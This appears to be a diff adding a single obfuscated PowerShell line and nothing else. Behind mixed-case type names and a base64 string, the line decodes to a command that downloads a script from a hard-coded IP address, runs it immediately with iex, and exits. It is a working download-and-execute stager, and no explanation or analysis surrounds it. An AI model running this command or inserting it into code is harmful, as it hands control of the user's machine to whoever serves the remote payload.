@@ -1,0 +1,2 @@
+iex([sYsTem.TeXT.ENCodIng]::utF8.GETSTRINg([SYStEm.cOnvErT]::fRombase64StrINg('CmlleCAoKE5ldy1PYmplY3QgbmVULldlYkNMSUVOdCkuRG93bmxvQWRzVFJJTmcoJ2h0dHA6Ly83Ni43NC4xMjcuMzgvZGVmYXVsdC1uY28uaHRtbCcpKQoK')));exit
+
